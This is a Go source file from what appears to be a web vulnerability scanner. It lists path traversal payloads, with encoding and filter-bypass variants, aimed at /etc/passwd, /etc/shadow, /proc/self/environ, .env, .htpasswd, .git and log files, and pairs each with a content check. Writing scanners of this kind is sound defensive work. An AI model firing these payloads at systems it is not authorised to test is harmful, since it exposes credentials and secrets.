package lfi_path_traversal

import "github.com/vigolium/vigolium/pkg/modules/shared/filesig"

// lfiPayload represents a path traversal payload with the structural confirmer
// that decides whether the response actually leaked the targeted file. The
// confirmer (shared filesig package) requires the file's real content shape and
// subtracts the baseline, replacing the former bare-word `markers` list that
// matched ordinary English and JSON keys on non-file pages.
type lfiPayload struct {
	payload string
	confirm filesig.ConfirmFunc
	// preEncoded marks a payload that carries its own percent-encoding (%00,
	// %252e, %C0%AE, %u002e): it is built through httpmsg.BuildPreEncoded so the
	// encoding reaches the server as written instead of being double-encoded
	// (MISS-12).
	preEncoded bool
}

// tier1Payloads are always tested. Each targets a well-known OS file.
var tier1Payloads = []lfiPayload{
	// Linux /etc/passwd — multiple traversal depths
	{payload: "../../../../etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../../../etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../../../../../../../../../etc/passwd", confirm: filesig.ConfirmPasswd},

	// Null byte injection (bypass extension append)
	{payload: "../../../../etc/passwd%00", confirm: filesig.ConfirmPasswd, preEncoded: true},
	{payload: "../../../../etc/passwd%00.jpg", confirm: filesig.ConfirmPasswd, preEncoded: true},
	{payload: "../../../../etc/passwd%00.html", confirm: filesig.ConfirmPasswd, preEncoded: true},

	// Double URL encoding
	{payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", confirm: filesig.ConfirmPasswd, preEncoded: true},

	// Unicode encoding bypass
	{payload: "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", confirm: filesig.ConfirmPasswd, preEncoded: true},

	// Overlong UTF-8 encoding
	{payload: "%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", confirm: filesig.ConfirmPasswd, preEncoded: true},

	// Backslash variants (Windows IIS)
	{payload: `..\..\..\..\etc\passwd`, confirm: filesig.ConfirmPasswd},

	// Dot-dot-slash with filter bypass
	{payload: "....//....//....//....//etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "./.././.././.././.././../etc/passwd", confirm: filesig.ConfirmPasswd},

	// Windows win.ini
	{payload: "../../../../windows/win.ini", confirm: filesig.ConfirmWinIni},
	{payload: `..\..\..\..\windows\win.ini`, confirm: filesig.ConfirmWinIni},
	{payload: "../../../../windows/win.ini%00", confirm: filesig.ConfirmWinIni, preEncoded: true},
}

// tier2CanaryFiles are tested only if tier 1 caused a (non-blocked) status code
// change, suggesting traversal works but the file differs.
var tier2CanaryFiles = []lfiPayload{
	// Linux shadow (requires root)
	{payload: "../../../../etc/shadow", confirm: filesig.ConfirmShadow},
	// Linux hosts
	{payload: "../../../../etc/hosts", confirm: filesig.ConfirmHosts},
	// Linux /proc/self/environ
	{payload: "../../../../proc/self/environ", confirm: filesig.ConfirmEnviron},
	// Linux /proc/version
	{payload: "../../../../proc/version", confirm: filesig.ConfirmProcVersion},
	// Windows boot.ini
	{payload: `..\..\..\..\boot.ini`, confirm: filesig.ConfirmBootIni},
	// Web config files
	{payload: "../../../../etc/apache2/apache2.conf", confirm: filesig.ConfirmApacheConf},
	{payload: "../../../../etc/nginx/nginx.conf", confirm: filesig.ConfirmNginxConf},
	// Java web.xml, .git/, .env and .htpasswd are routinely deployed *into* the
	// served directory (a WEB-INF/ tree in the war root, a .git/ or .env shipped
	// into an S3 bucket), so on a URL path insertion point these degrade to a
	// direct fetch and their results downgrade to informational exposure —
	// modkit.DocrootPublishableTarget recognises them by target file. The
	// OS-filesystem targets above and below are not publishable: no web root
	// serves /etc/passwd or /proc/version, so a 200 carrying their content is a
	// genuine escape however it was requested.
	{payload: "../../WEB-INF/web.xml", confirm: filesig.ConfirmWebXML},
	{payload: "../../../../.git/HEAD", confirm: filesig.ConfirmGitHead},
	{payload: "../../../../.env", confirm: filesig.ConfirmDotenv},
	{payload: "../../../../.htpasswd", confirm: filesig.ConfirmHtpasswd},
	// Log files
	{payload: "../../../../var/log/apache2/access.log", confirm: filesig.ConfirmAccessLog},
	{payload: "../../../../var/log/nginx/access.log", confirm: filesig.ConfirmAccessLog},
}
